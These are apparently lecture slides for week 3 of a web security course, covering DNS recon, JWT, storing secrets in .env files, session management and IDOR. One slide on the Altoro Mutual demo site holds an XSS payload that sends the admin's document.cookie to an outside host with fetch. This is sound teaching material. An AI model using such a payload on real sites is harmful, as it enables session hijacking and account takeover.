---
title: "Week 3 - Auth and IAM"
layout: "bundle"
outputs: ["Reveal"]
date: 2023-02-24T02:57:21+10:00
---

{{< slide class="center" >}}

## Week 3

---

## DNS Recon Recap

* Walkthrough
  * [Sublist3r](https://github.com/aboul3la/Sublist3r)
  * [Word List](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)

---

## Lecture Review

* Build a Flask app
* Python semantics
  * `__name__`, `__main__`, `__dir__`
* JWT
  * Next slide!

---

## More on JWT

* Anatomy of a JWT token
* What should be in a JWT token
* Pros and Cons
* Store secrets in a `.env`?
  * Why `.env`?

---

### DevOps, DevSecOps, DevSec..Oops..

{{% section %}}

> More on this in later weeks

* `.env` + `.gitignore`
* Scoped environment
* ... Why _not_ `.env`

---

If it's in the environment, the entire process can see it.. even if you unset it in the code* >:(

*: sometimes

> `/proc/self/environ`

{{% /section %}}

---

> An alternative

* External data sources
  * i.e. AWS Parameter Store
  * i.e. Google Secrets Manager
  * i.e. HashiCorp Vault
  * i.e. Apple KeyChain
* Centralised management
* Rotation + deployment at scale
* Access control

---

## Back to Altoro Mutual

jk the demo did work I was just dumb

> 👉 Login as admin first 👈

```html
<script>
  fetch("https://[...]/?v="+btoa(document.cookie))
</script>aaa
```

---

## How to be a script kiddie

* Python + `requests`
* Node.js + `node-fetch`
* JavaScript + `fetch`
* JavaScript + `XMLHTTPRequest`
* etc

---

## Learning HTTP Responses

* 2XX - Success
* 3XX - Redirect
* 4XX - Client Error
  * [418](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418)
  * [451](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/451)
* 5XX - Server Error

---

## Session Management

* Last week, auth via cookies
* What does it mean to "log out"
* Broken session management

---

# IDOR

> Insecure Direct Object Reference


> 🚪🚪

---

## Logistics

Midterm Exam, Reports
